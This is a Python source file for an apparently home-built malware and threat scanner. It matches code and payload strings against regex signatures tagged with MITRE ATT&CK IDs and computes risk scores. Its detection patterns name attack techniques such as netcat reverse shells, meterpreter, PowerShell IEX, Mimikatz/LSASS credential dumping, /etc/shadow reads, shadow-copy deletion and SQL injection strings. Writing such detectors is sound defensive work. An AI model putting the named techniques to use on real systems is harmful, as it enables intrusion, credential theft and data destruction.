#             "T1190_Overflow":       {"id": "T1190", "name": "Buffer Overflow Risk", "severity": "Medium", "score": 60, "pattern": r"\b(strcpy|strcat|gets|sprintf)\b"},
#             "T1203_Deserial":       {"id": "T1203", "name": "Deserialization Exploit", "severity": "Critical", "score": 90, "pattern": r"(pickle\.loads|ObjectInputStream|binary_unserialize)"},

#             # =================================================================
#             # 7. WEB & SQL ATTACKS
#             # =================================================================
#             "T1190_SQLi":           {"id": "T1190", "name": "SQL Injection", "severity": "Critical", "score": 90, "pattern": r"(UNION\s+SELECT|OR\s+1=1|xp_cmdshell|sp_configure)"},
#             "T1190_XSS":            {"id": "T1190", "name": "XSS / Script Injection", "severity": "High", "score": 80, "pattern": r"(<script>|javascript:|onerror=|onload=)"},
#             "T1006_Traversal":      {"id": "T1006", "name": "Directory Traversal / LFI", "severity": "High", "score": 75, "pattern": r"(\.\./\.\./|/etc/passwd|c:\\windows\\win.ini)"},

#             # =================================================================
#             # 8. OBFUSCATION & EVASION
#             # =================================================================
#             "T1027_Obfuscation":    {"id": "T1027", "name": "Obfuscation Technique", "severity": "Medium", "score": 60, "pattern": r"(base64_decode|from_base64|rot13|xor|eval\(|unescape|charcode)"},
#             "T1027_Packing":        {"id": "T1027.002", "name": "Packed Binary (UPX)", "severity": "High", "score": 70, "pattern": r"(UPX0|UPX1|MPRESS|ASPack)"},
#             "T1622_AntiDebug":      {"id": "T1622", "name": "Anti-Debugging", "severity": "Medium", "score": 60, "pattern": r"(IsDebuggerPresent|CheckRemoteDebuggerPresent|ptrace_scope)"},
#             "T1070_Timestomp":      {"id": "T1070", "name": "Timestomping/Cleaning", "severity": "Medium", "score": 50, "pattern": r"(touch\s+-r|wevtutil\s+cl|Clear-EventLog)"},

#             # =================================================================
#             # 9. STEGANOGRAPHY & FORENSICS
#             # =================================================================
#             "T1027_Stego":          {"id": "T1027.003", "name": "Steganography Tool", "severity": "High", "score": 75, "pattern": r"(steghide|openstego|outguess|JPHide|LSB DATA|PK\x03\x04)"},
#             "T1505_Polyglot":       {"id": "T1505.003", "name": "Polyglot Image/Web Shell", "severity": "Critical", "score": 95, "pattern": r"(image/php|<\?php)"}
#         }

#     def _compile_patterns(self):
#         """
#         Optimizes regex compilation for high-performance scanning.
#         Handles invalid patterns gracefully.
#         """
#         compiled = {}
#         for key, data in self.signatures.items():
#             try:
#                 # Compile with IGNORECASE to catch variations like 'PoWeRsHeLl'
#                 compiled[key] = re.compile(data['pattern'], re.IGNORECASE)
#             except re.error as e:
#                 print(f"[ERROR] Invalid Regex for {key}: {e}")
#         return compiled

#     def scan(self, code_snippet: str):
#         """
#         Scans input string (Code, Binary Strings, PCAP Payload) against the engine.
#         Returns a list of MITRE dictionaries.
#         """
#         findings = []
#         if not code_snippet:
#             return findings
            
#         for key, pattern in self.compiled_patterns.items():
#             if pattern.search(code_snippet):
#                 # Return the full metadata object for rich reporting
#                 match_data = self.signatures[key].copy()
#                 match_data['signature_key'] = key
#                 findings.append(match_data)
#         return findings

# # =============================================================================
# # GLOBAL INSTANCE & COMPATIBILITY HELPERS
# # =============================================================================

# # 1. The Singleton Engine
# MITRE_ENGINE = EnterpriseThreatEngine()

# # 2. Compatibility Dictionary (For Risk Engine lookups)
# MITRE_SIGNATURES = MITRE_ENGINE.signatures

# # 3. Compatibility Helper Function
# def get_mitre_tag(key, fallback_message="Generic Threat"):
#     """
#     Backward-compatible helper for legacy modules.
#     Matches the 'get_mitre_tag' format expected by other files.
#     """
#     # 1. Try Direct Lookup
#     data = MITRE_SIGNATURES.get(key)
#     if data:
#         return f"[{data['id']}] {data['name']}"
    
#     # 2. Try Fuzzy Key Lookup
#     for sig_key, sig_data in MITRE_SIGNATURES.items():
#         if key.lower() in sig_key.lower():
#             return f"[{sig_data['id']}] {sig_data['name']}"
            
#     return f"[GENERIC] {fallback_message}"

import re
import json

class EnterpriseThreatEngine:
    """
    CYBERSENTINEL THREAT ENGINE (MASTER V6.0 - SENIOR EDITION)
    ----------------------------------------------------------
    High-Performance O(1) detection engine mapping 150+ unique signatures 
    across Source Code, Binaries, Network, and Steganography.
    """
    
    def __init__(self):
        """
        Initializes the Threat Engine.
        Compiles all 150+ Regex signatures into memory for fast matching.
        """
        self.signatures = self._load_signatures()
        self.compiled_patterns = self._compile_patterns()

    def _load_signatures(self):
        """
        The Master Database of Threat Signatures.
        Format: "Key": {"id": "Txxxx", "name": "...", "severity": "...", "score": 0-100, "pattern": r"..."}
        """
        return {
            # =================================================================
            # 1. RANSOMWARE, CRYPTO & DESTRUCTIVE (CRITICAL - Score 95-100)
            # =================================================================
            "cryptography.fernet":  {"id": "T1486", "name": "Ransomware Encryption Lib", "severity": "Critical", "score": 100, "pattern": r"\b(cryptography\.fernet)\b"},
            "Fernet":               {"id": "T1486", "name": "Symmetric Encryption (Fernet)", "severity": "High", "score": 90, "pattern": r"\b(Fernet)\b"},
            "pyAesCrypt":           {"id": "T1486", "name": "File Encryption Lib", "severity": "Critical", "score": 100, "pattern": r"\b(pyAesCrypt)\b"},
            "AES.new":              {"id": "T1486", "name": "AES Encryption Init", "severity": "High", "score": 85, "pattern": r"\b(AES\.new)\b"},
            "ChaCha20":             {"id": "T1486", "name": "ChaCha20 Stream Cipher", "severity": "High", "score": 85, "pattern": r"\b(ChaCha20)\b"},
            "BloodyCrypto":         {"id": "T1486", "name": "Known Ransomware Sig", "severity": "Critical", "score": 100, "pattern": r"\b(BloodyCrypto)\b"},
            "vssadmin delete":      {"id": "T1490", "name": "Shadow Copy Deletion", "severity": "Critical", "score": 100, "pattern": r"(vssadmin\s+delete)"},
            "wbadmin":              {"id": "T1490", "name": "Backup Deletion", "severity": "Critical", "score": 100, "pattern": r"(wbadmin.*delete)"},
            "bcdedit":              {"id": "T1490", "name": "Boot Config Modification", "severity": "High", "score": 90, "pattern": r"(bcdedit.*recoveryenabled)"},
            "cipher /w":            {"id": "T1485", "name": "Drive Wiping", "severity": "Critical", "score": 100, "pattern": r"(cipher\s+/w)"},
            "shutil.rmtree":        {"id": "T1485", "name": "Recursive File Deletion", "severity": "High", "score": 85, "pattern": r"(shutil\.rmtree)"},
            "fs.unlink":            {"id": "T1070.004", "name": "File Deletion (JS)", "severity": "Medium", "score": 50, "pattern": r"(fs\.unlink)"},
            "Format-Volume":        {"id": "T1485", "name": "Volume Formatting", "severity": "Critical", "score": 100, "pattern": r"(Format-Volume)"},
            "BitLocker":            {"id": "T1486", "name": "BitLocker Manipulation", "severity": "High", "score": 90, "pattern": r"(manage-bde|BitLocker|Enable-BitLocker)"},
            "CoinHive":             {"id": "T1496", "name": "Cryptojacking Script", "severity": "High", "score": 85, "pattern": r"(CoinHive)"},
            "XMRig":                {"id": "T1496", "name": "Monero Miner", "severity": "High", "score": 85, "pattern": r"(XMRig)"},
            "Stratum+TCP":          {"id": "T1496", "name": "Mining Protocol", "severity": "High", "score": 85, "pattern": r"(Stratum\+TCP)"},

            # =================================================================
            # 2. COMMAND & CONTROL (C2) - NETWORK FORENSICS (CRITICAL/HIGH)
            # =================================================================
            "nc -e":                {"id": "T1095", "name": "Netcat Reverse Shell", "severity": "Critical", "score": 100, "pattern": r"(nc\s+-e|nc\.exe\s+-e)"},
            "socket":               {"id": "T1095", "name": "Raw Socket Connection", "severity": "Medium", "score": 50, "pattern": r"(socket\.socket|socket\.connect)"},
            "meterpreter":          {"id": "T1095", "name": "Meterpreter Payload", "severity": "Critical", "score": 100, "pattern": r"(meterpreter|reverse_tcp)"},
            "empire":               {"id": "T1095", "name": "Empire C2 Agent", "severity": "Critical", "score": 100, "pattern": r"(empire agent)"},
            "chisel":               {"id": "T1090", "name": "Tunneling Tool (Chisel)", "severity": "High", "score": 90, "pattern": r"\b(chisel)\b"},
            "ngrok":                {"id": "T1090", "name": "Tunneling Tool (Ngrok)", "severity": "High", "score": 85, "pattern": r"\b(ngrok)\b"},
            "User-Agent: BlackSun": {"id": "T1071", "name": "Malicious User-Agent", "severity": "High", "score": 80, "pattern": r"(User-Agent:\s*BlackSun)"},
            "curl -A":              {"id": "T1071", "name": "Curl User-Agent Spoofing", "severity": "Medium", "score": 50, "pattern": r"(curl\s+-A)"},
            "4444":                 {"id": "T1095", "name": "Metasploit Default Port", "severity": "Critical", "score": 90, "pattern": r"(?<=[:\s])4444(?=[:\s]|$)"},
            "6667":                 {"id": "T1132.001", "name": "IRC Botnet Port", "severity": "High", "score": 80, "pattern": r"(?<=[:\s])6667(?=[:\s]|$)"},
            "1337":                 {"id": "T1095", "name": "Leet/Hacker Port", "severity": "Medium", "score": 60, "pattern": r"(?<=[:\s])1337(?=[:\s]|$)"},
            "3389":                 {"id": "T1021.001", "name": "RDP Access", "severity": "Medium", "score": 50, "pattern": r"(?<=[:\s])3389(?=[:\s]|$)"},
            "23":                   {"id": "T1014", "name": "Telnet Cleartext", "severity": "High", "score": 75, "pattern": r"(?<=[:\s])23(?=[:\s]|$)"},

            # =================================================================
            # 3. EXECUTION - MULTI-LANGUAGE (TUNED: MEDIUM/HIGH)
            # =================================================================
            "system(":              {"id": "T1059", "name": "System Command Execution", "severity": "Medium", "score": 55, "pattern": r"system\("}, 
            "popen(":               {"id": "T1059", "name": "Pipe Open Command", "severity": "Medium", "score": 55, "pattern": r"popen\("},
            "execve(":              {"id": "T1059", "name": "Process Execution (execve)", "severity": "High", "score": 75, "pattern": r"execve\("},
            "os.system":            {"id": "T1059.006", "name": "Python System Cmd", "severity": "Medium", "score": 50, "pattern": r"os\.system"},
            "subprocess.run":       {"id": "T1059.006", "name": "Python Subprocess Run", "severity": "Medium", "score": 50, "pattern": r"subprocess\.run"},
            "pty.spawn":            {"id": "T1059.006", "name": "Python PTY Spawn (Shell)", "severity": "Critical", "score": 90, "pattern": r"pty\.spawn"},
            "os.execute":           {"id": "T1059", "name": "Lua OS Execute", "severity": "Medium", "score": 55, "pattern": r"os\.execute"},
            "io.popen":             {"id": "T1059", "name": "Lua IO Popen", "severity": "Medium", "score": 55, "pattern": r"io\.popen"},
            "syscall":              {"id": "T1059", "name": "Syscall Execution", "severity": "High", "score": 70, "pattern": r"syscall\.Exec"},
            "exec(":                {"id": "T1059", "name": "Generic Exec Command", "severity": "Medium", "score": 55, "pattern": r"exec\("},
            "eval(":                {"id": "T1059", "name": "Dynamic Code Execution (Eval)", "severity": "Medium", "score": 60, "pattern": r"eval\("},
            "shell_exec":           {"id": "T1505.003", "name": "PHP Shell Exec", "severity": "Critical", "score": 95, "pattern": r"shell_exec"},
            "passthru":             {"id": "T1505.003", "name": "PHP Passthru", "severity": "High", "score": 85, "pattern": r"passthru"},
            "proc_open":            {"id": "T1505.003", "name": "PHP Process Open", "severity": "High", "score": 85, "pattern": r"proc_open"},
            "child_process":        {"id": "T1059.007", "name": "NodeJS Child Process", "severity": "Medium", "score": 60, "pattern": r"child_process"},
            "spawnSync":            {"id": "T1059.007", "name": "NodeJS Spawn Sync", "severity": "Medium", "score": 60, "pattern": r"spawnSync"},
            "WScript.Shell":        {"id": "T1059.005", "name": "Windows Script Host", "severity": "High", "score": 85, "pattern": r"WScript\.Shell"},

            # =================================================================
            # 4. WEB, SQL & INJECTION THREATS (HIGH/CRITICAL)
            # =================================================================
            "UNION SELECT":         {"id": "T1190", "name": "SQL Injection Pattern", "severity": "Critical", "score": 95, "pattern": r"(UNION\s+SELECT)"},
            "OR 1=1":               {"id": "T1190", "name": "SQL Injection Bypass", "severity": "Critical", "score": 95, "pattern": r"(OR\s+['\"]?1['\"]?\s*=\s*['\"]?1)"},
            "xp_cmdshell":          {"id": "T1059.003", "name": "MSSQL Command Shell", "severity": "Critical", "score": 100, "pattern": r"(xp_cmdshell)"},
            "sp_configure":         {"id": "T1505", "name": "SQL Server Configuration", "severity": "High", "score": 85, "pattern": r"(sp_configure)"},
            "<script>":             {"id": "T1190", "name": "Cross-Site Scripting (XSS)", "severity": "High", "score": 80, "pattern": r"(<script>)"},
            "<!ENTITY":             {"id": "T1190", "name": "XXE Injection", "severity": "High", "score": 85, "pattern": r"(<!ENTITY)"},
            "../../":               {"id": "T1006", "name": "Path Traversal", "severity": "High", "score": 75, "pattern": r"(\.\./\.\./)"},
            "LFI":                  {"id": "T1006", "name": "Local File Inclusion", "severity": "High", "score": 75, "pattern": r"(/etc/passwd|win\.ini)"},
            "CSRF":                 {"id": "T1190", "name": "Cross-Site Request Forgery", "severity": "Medium", "score": 60, "pattern": r"(csrf_token)"},

            # =================================================================
            # 5. MEMORY & BINARY EXPLOITS (CRITICAL)
            # =================================================================
            "VirtualAlloc":         {"id": "T1055", "name": "Memory Allocation (Injection)", "severity": "Critical", "score": 95, "pattern": r"(VirtualAlloc)"},
            "CreateRemoteThread":   {"id": "T1055", "name": "Thread Injection", "severity": "Critical", "score": 95, "pattern": r"(CreateRemoteThread)"},
            "WriteProcessMemory":   {"id": "T1055", "name": "Process Memory Write", "severity": "Critical", "score": 95, "pattern": r"(WriteProcessMemory)"},
            "ptrace":               {"id": "T1055", "name": "Process Debugging/Injection", "severity": "High", "score": 85, "pattern": r"(ptrace)"},
            "mprotect":             {"id": "T1055", "name": "Memory Protection Change (RWX)", "severity": "Critical", "score": 90, "pattern": r"(mprotect)"},
            "LD_PRELOAD":           {"id": "T1574.006", "name": "Shared Object Injection", "severity": "Critical", "score": 100, "pattern": r"(LD_PRELOAD)"},
            "loadlibrary":          {"id": "T1106", "name": "DLL Loading", "severity": "Medium", "score": 60, "pattern": r"(loadlibrary|LoadLibrary)"},
            "strcpy(":              {"id": "T1190", "name": "Buffer Overflow Risk (strcpy)", "severity": "Medium", "score": 55, "pattern": r"strcpy\("},
            "gets(":                {"id": "T1190", "name": "Banned Function (gets)", "severity": "High", "score": 70, "pattern": r"gets\("},
            "pickle.loads":         {"id": "T1203", "name": "Python Pickle Deserialization", "severity": "Critical", "score": 95, "pattern": r"pickle\.loads"},
            "RtlMoveMemory":        {"id": "T1055", "name": "Memory Move Operation", "severity": "High", "score": 80, "pattern": r"(RtlMoveMemory)"},

            # =================================================================
            # 6. COMPILED LANGUAGES (Java, Go, Rust, .NET)
            # =================================================================
            "Runtime.getRuntime":   {"id": "T1059", "name": "Java Runtime Exec", "severity": "High", "score": 75, "pattern": r"Runtime\.getRuntime"},
            "ProcessBuilder":       {"id": "T1059", "name": "Java ProcessBuilder", "severity": "Medium", "score": 65, "pattern": r"ProcessBuilder"},
            "os/exec":              {"id": "T1059", "name": "Go Command Exec", "severity": "Medium", "score": 60, "pattern": r"os/exec"},
            "std::process":         {"id": "T1059", "name": "Rust Command Exec", "severity": "Medium", "score": 60, "pattern": r"std::process"},
            "Process.Start":        {"id": "T1059", "name": ".NET Process Start", "severity": "Medium", "score": 60, "pattern": r"Process\.Start"},
            "NSTask":               {"id": "T1059", "name": "Swift/Obj-C Process", "severity": "Medium", "score": 60, "pattern": r"NSTask"},

            # =================================================================
            # 7. SHELL & MACROS (PowerShell, VBA, Bash)
            # =================================================================
            "Invoke-Expression":    {"id": "T1059.001", "name": "PowerShell IEX", "severity": "Critical", "score": 90, "pattern": r"(Invoke-Expression)"},
            "IEX":                  {"id": "T1059.001", "name": "PowerShell IEX Short", "severity": "Critical", "score": 90, "pattern": r"\b(IEX)\b"},
            "EncodedCommand":       {"id": "T1027", "name": "PowerShell Encoded Command", "severity": "High", "score": 80, "pattern": r"(EncodedCommand)"},
            "cmd.exe":              {"id": "T1059.003", "name": "Windows Command Prompt", "severity": "Medium", "score": 50, "pattern": r"(cmd\.exe)"},
            "/bin/bash":            {"id": "T1059.004", "name": "Linux Bash Shell", "severity": "Medium", "score": 50, "pattern": r"(/bin/bash)"},
            "AutoOpen":             {"id": "T1204.002", "name": "VBA Macro AutoRun", "severity": "Critical", "score": 95, "pattern": r"(AutoOpen)"},
            "Document_Open":        {"id": "T1204.002", "name": "VBA Document Open", "severity": "Critical", "score": 95, "pattern": r"(Document_Open)"},
            "WScript":              {"id": "T1059.005", "name": "Windows Script Host", "severity": "High", "score": 80, "pattern": r"(WScript)"},

            # =================================================================
            # 8. STEGANOGRAPHY & FORENSICS (HIGH)
            # =================================================================
            "LSB DATA":             {"id": "T1027.003", "name": "Steganography (LSB Anomaly)", "severity": "High", "score": 80, "pattern": r"(LSB DATA)"},
            "steghide":             {"id": "T1027.003", "name": "Steganography Tool (Steghide)", "severity": "High", "score": 85, "pattern": r"(steghide)"},
            "openstego":            {"id": "T1027.003", "name": "Steganography Tool (OpenStego)", "severity": "High", "score": 85, "pattern": r"(openstego)"},
            "outguess":             {"id": "T1027.003", "name": "OutGuess Stego Tool", "severity": "High", "score": 85, "pattern": r"(outguess)"},
            "JPHide":               {"id": "T1027.003", "name": "JPHide Stego Artifact", "severity": "High", "score": 85, "pattern": r"(JPHide)"},
            "image/php":            {"id": "T1505.003", "name": "Polyglot Image (PHP Web Shell)", "severity": "Critical", "score": 100, "pattern": r"(image/php|<\?php)"},
            "exiftool":             {"id": "T1005", "name": "Metadata Manipulation Tool", "severity": "Medium", "score": 40, "pattern": r"(exiftool)"},
            "PK\x03\x04":           {"id": "T1027", "name": "Embedded Zip/Jar Artifact", "severity": "Medium", "score": 50, "pattern": r"(PK\x03\x04)"},
            "JFIF":                 {"id": "T1027.003", "name": "JPEG Header (Stego Check)", "severity": "Low", "score": 10, "pattern": r"(JFIF)"},

            # =================================================================
            # 9. CREDENTIAL THEFT & CLOUD (CRITICAL/HIGH)
            # =================================================================
            "Mimikatz":             {"id": "T1003", "name": "Credential Dumping", "severity": "Critical", "score": 100, "pattern": r"(Mimikatz)"},
            "samdump":              {"id": "T1003", "name": "SAM Hive Dumping", "severity": "Critical", "score": 100, "pattern": r"(samdump)"},
            "lsass":                {"id": "T1003.001", "name": "LSASS Memory Access", "severity": "Critical", "score": 100, "pattern": r"(lsass)"},
            "keylog":               {"id": "T1056.001", "name": "Keylogging Activity", "severity": "High", "score": 85, "pattern": r"(keylog)"},
            "GetAsyncKeyState":     {"id": "T1056.001", "name": "Keystroke Capture (API)", "severity": "High", "score": 85, "pattern": r"(GetAsyncKeyState)"},
            "pynput":               {"id": "T1056.001", "name": "Python Keylogger Lib", "severity": "High", "score": 80, "pattern": r"(pynput)"},
            "169.254.169.254":      {"id": "T1552", "name": "Cloud Metadata Service", "severity": "Critical", "score": 95, "pattern": r"(169\.254\.169\.254)"},
            "AKIA":                 {"id": "T1552", "name": "AWS Access Key", "severity": "High", "score": 80, "pattern": r"(AKIA[0-9A-Z]{16})"},
            "id_rsa":               {"id": "T1552.004", "name": "SSH Private Key", "severity": "High", "score": 80, "pattern": r"(id_rsa)"},
            "shadow file":          {"id": "T1003.008", "name": "/etc/shadow Access", "severity": "Critical", "score": 95, "pattern": r"(/etc/shadow)"},

            # =================================================================
            # 10. PERSISTENCE & EVASION (HIGH)
            # =================================================================
            "CurrentVersion\\Run":  {"id": "T1547.001", "name": "Registry Persistence", "severity": "High", "score": 85, "pattern": r"(CurrentVersion\\\\Run)"},
            "schtasks":             {"id": "T1053.005", "name": "Scheduled Task Creation", "severity": "High", "score": 75, "pattern": r"(schtasks)"},
            "crontab":              {"id": "T1053.003", "name": "Cron Job Persistence", "severity": "High", "score": 75, "pattern": r"(crontab)"},
            "sc create":            {"id": "T1543.003", "name": "Service Creation", "severity": "High", "score": 80, "pattern": r"(sc\s+create)"},
            "IsDebuggerPresent":    {"id": "T1622", "name": "Anti-Debugging Check", "severity": "Medium", "score": 60, "pattern": r"(IsDebuggerPresent)"},
            "timestomp":            {"id": "T1070.006", "name": "Timestamp Manipulation", "severity": "Medium", "score": 55, "pattern": r"(timestomp)"},
            "attrib +h":            {"id": "T1027", "name": "Hidden File Attribute", "severity": "Medium", "score": 50, "pattern": r"(attrib\s+\+h)"},

            # =================================================================
            # 11. OBFUSCATION & DEOBFUSCATOR HOOKS (MEDIUM/LOW)
            # =================================================================
            "base64":               {"id": "T1027", "name": "Base64 Encoding", "severity": "Low", "score": 30, "pattern": r"(base64)"},
            "rot13":                {"id": "T1027", "name": "Simple Cipher (ROT13)", "severity": "Low", "score": 25, "pattern": r"(rot13)"},
            "UPX":                  {"id": "T1027.002", "name": "Binary Packing (UPX)", "severity": "High", "score": 75, "pattern": r"(UPX)"},
            "hex":                  {"id": "T1027", "name": "Hexadecimal Encoding", "severity": "Low", "score": 25, "pattern": r"(\\x[0-9a-f]{2})"},
            "xor":                  {"id": "T1027", "name": "XOR Encryption", "severity": "Medium", "score": 50, "pattern": r"(xor)"},
            "FromBase64String":     {"id": "T1027", "name": "PowerShell Decoding", "severity": "Medium", "score": 60, "pattern": r"(FromBase64String)"},

            # =================================================================
            # 12. MISC & NICHE
            # =================================================================
            "flag{":                {"id": "T1027.003", "name": "CTF/Stego Flag", "severity": "Medium", "score": 40, "pattern": r"(flag\{)"},
            "system2(":             {"id": "T1059", "name": "R System2 Command", "severity": "Medium", "score": 55, "pattern": r"system2\("},
            "unix(":                {"id": "T1059.004", "name": "MATLAB Unix Cmd", "severity": "Medium", "score": 55, "pattern": r"unix\("},
            "dos(":                 {"id": "T1059.003", "name": "MATLAB DOS Cmd", "severity": "Medium", "score": 55, "pattern": r"dos\("},
            "os.walk":              {"id": "T1083", "name": "File System Traversal", "severity": "Low", "score": 15, "pattern": r"os\.walk"},

            # =================================================================
            # 13. RECONNAISSANCE (LOW - Score 10-30) - Fixes Silent Killers
            # =================================================================
            "whoami":               {"id": "T1033", "name": "User Discovery (whoami)", "severity": "Low", "score": 20, "pattern": r"\b(whoami)\b"},
            "ipconfig":             {"id": "T1016", "name": "Network Config (ipconfig)", "severity": "Low", "score": 20, "pattern": r"\b(ipconfig)\b"},
            "ifconfig":             {"id": "T1016", "name": "Network Config (ifconfig)", "severity": "Low", "score": 20, "pattern": r"\b(ifconfig)\b"},
            "netstat":              {"id": "T1016", "name": "Network Connections", "severity": "Low", "score": 20, "pattern": r"\b(netstat)\b"},
            "ping":                 {"id": "T1046", "name": "Network Connectivity (Ping)", "severity": "Info", "score": 10, "pattern": r"\b(ping)\b"},
            "systeminfo":           {"id": "T1082", "name": "System Information", "severity": "Low", "score": 25, "pattern": r"\b(systeminfo)\b"},
            "tasklist":             {"id": "T1057", "name": "Process List", "severity": "Low", "score": 20, "pattern": r"\b(tasklist)\b"},
            "Get-Process":          {"id": "T1057", "name": "Powershell Process List", "severity": "Low", "score": 20, "pattern": r"(Get-Process)"}
        }

    def _compile_patterns(self):
        """
        Optimizes regex compilation for high-performance scanning.
        """
        compiled = {}
        for key, data in self.signatures.items():
            try:
                # Compile with IGNORECASE to catch variations like 'PoWeRsHeLl'
                compiled[key] = re.compile(data['pattern'], re.IGNORECASE)
            except re.error as e:
                print(f"[ERROR] Invalid Regex for {key}: {e}")
        return compiled

    def scan(self, code_snippet: str):
        """
        Scans input string (Code, Binary Strings, PCAP Payload) against the engine.
        Returns a list of MITRE dictionaries.
        """
        findings = []
        if not code_snippet:
            return findings
            
        for key, pattern in self.compiled_patterns.items():
            if pattern.search(code_snippet):
                # Return the full metadata object for rich reporting
                match_data = self.signatures[key].copy()
                match_data['signature_key'] = key
                findings.append(match_data)
        return findings

    # 🔥 UPDATED RISK CALCULATION WITH SILENT KILLER TRACEBACK
    def calculate_risk_matrix(self, findings):
        """
        Calculates a 'Kill Chain Score' based on findings.
        Includes console traceback to identify why a score was given.
        """
        if not findings:
            return 0, "Clean"

        print("\n🕵️ [SILENT KILLER] Calculating Risk from Findings...")
        
        # 1. Calculate Base Scores
        scores = []
        for f in findings:
            score = f.get('score', 10)
            scores.append(score)
            print(f"   👉 Matched: {f['id']} - {f['name']} | Score: {score}")

        base_score = max(scores) if scores else 0
        
        # 2. Identify Tactics
        unique_tactics = set(f['id'].split('.')[0] for f in findings)
        tactic_count = len(unique_tactics)
        
        # 3. Apply Multiplier (Only for significant threats)
        # We don't want 3 'Low' recon items to become 'High'
        multiplier = 1.0
        if base_score > 40: # Only multiply if we have at least Medium threats
            if tactic_count == 2: multiplier = 1.25
            elif tactic_count >= 3: multiplier = 1.5

        final_score = int(min(base_score * multiplier, 100))
        
        print(f"   📊 CALCULATION: Max Score ({base_score}) * Multiplier ({multiplier}) = {final_score}")
        
        verdict = "Clean"
        if final_score > 75: verdict = "CRITICAL THREAT"
        elif final_score > 50: verdict = "Malicious"
        elif final_score > 20: verdict = "Suspicious"
        
        return final_score, verdict

# =============================================================================
# GLOBAL INSTANCE & COMPATIBILITY HELPERS
# =============================================================================

# 1. The Singleton Engine
MITRE_ENGINE = EnterpriseThreatEngine()

# 2. Compatibility Dictionary (For Risk Engine lookups if needed externally)
MITRE_SIGNATURES = MITRE_ENGINE.signatures

# 3. Compatibility Helper Function (For legacy modules expecting get_mitre_tag)
def get_mitre_tag(key, fallback_message="Generic Threat"):
    """
    Backward-compatible helper for legacy modules.
    Matches the 'get_mitre_tag' format expected by other files.
    """
    # 1. Try Direct Lookup
    data = MITRE_SIGNATURES.get(key)
    if data:
        return f"[{data['id']}] {data['name']}"
    
    # 2. Try Fuzzy Key Lookup
    for sig_key, sig_data in MITRE_SIGNATURES.items():
        if key.lower() in sig_key.lower():
            return f"[{sig_data['id']}] {sig_data['name']}"
            
    return f"[GENERIC] {fallback_message}"

# 🔥 ADDED HELPER: Standalone Risk Score Function
def get_risk_score(behaviors):
    """
    Calculates score based on Weighted MITRE Severity.
    (Compatibility wrapper for modules that pass string lists instead of finding objects)
    """
    score = 0
    unique_behaviors = set(behaviors)
    
    for b in unique_behaviors:
        for sig_key, info in MITRE_SIGNATURES.items():
            if info['id'] in b:
                if info['severity'] == "Critical": score += 40
                elif info['severity'] == "High": score += 20
                elif info['severity'] == "Medium": score += 10
                else: score += 5
                break 
    
    return min(score, 100)